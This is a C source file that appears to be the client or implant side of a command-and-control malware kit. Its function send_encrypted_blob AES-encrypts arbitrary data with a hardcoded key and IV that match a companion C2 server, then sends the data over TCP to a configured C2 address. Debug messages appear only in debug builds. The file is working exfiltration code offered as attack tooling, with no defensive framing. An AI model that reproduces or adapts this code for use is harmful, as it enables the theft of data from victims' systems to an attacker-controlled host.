#include "C2.h"
#include "aes.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

// === CONFIGURATION ===
// Hardcoded AES key and IV (must match C2Server.c)
// Using AES-128-CBC mode (16-byte key, 16-byte IV)
static const uint8_t aes_key[16] = {
    0x13, 0x37, 0xBA, 0xD0, 0xC0, 0xFF, 0xEE, 0x12,
    0x42, 0x24, 0x81, 0x19, 0x99, 0x88, 0x77, 0x66};

static const uint8_t aes_iv[16] = {
    0x10, 0x32, 0x54, 0x76, 0x98, 0xBA, 0xDC, 0xFE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};



// === MAIN FUNCTION: send_encrypted_blob ===
// Encrypts with AES-CBC, and sends over TCP
int send_encrypted_blob(uint8_t file_type, const uint8_t *data, size_t length)
{
#ifdef DEBUG
    fprintf(stderr, "[DEBUG] Preparing to send %zu bytes (type: %u)\n", length, file_type);
#endif

    uint8_t pad = AES_BLOCKLEN - (length % AES_BLOCKLEN);
    size_t padded_len = length + pad;

    uint8_t *buffer = malloc(padded_len);
    if (!buffer)
    {
#ifdef DEBUG
        perror("[DEBUG] Memory allocation failed");
#endif
        return 0;
    }

    memcpy(buffer, data, length);
    memset(buffer + length, pad, pad); // PKCS#7 padding

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_encrypt_buffer(&ctx, buffer, padded_len);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
#ifdef DEBUG
        perror("[DEBUG] socket()");
#endif
        free(buffer);
        return 0;
    }

    struct sockaddr_in server = {0};
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server.sin_addr);

    if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
#ifdef DEBUG
        perror("[DEBUG] connect()");
#endif
        close(sockfd);
        free(buffer);
        return 0;
    }

#ifdef DEBUG
    fprintf(stderr, "[DEBUG] Connected to %s:%d\n", C2_IP, C2_PORT);
#endif

    // === NEW === send 1-byte file type + 4-byte payload length
    uint32_t net_len = htonl(padded_len);
    if (send(sockfd, &file_type, 1, 0) != 1 ||
        send(sockfd, &net_len, 4, 0) != 4 ||
        send(sockfd, buffer, padded_len, 0) != (ssize_t)padded_len)
    {
#ifdef DEBUG
        fprintf(stderr, "[DEBUG] Failed to send full payload (type, len, or data)\n");
#endif
        close(sockfd);
        free(buffer);
        return 0;
    }

#ifdef DEBUG
    fprintf(stderr, "[DEBUG] Encrypted data sent successfully (type %u)\n", file_type);
#endif

    close(sockfd);
    free(buffer);
    return 1;
}
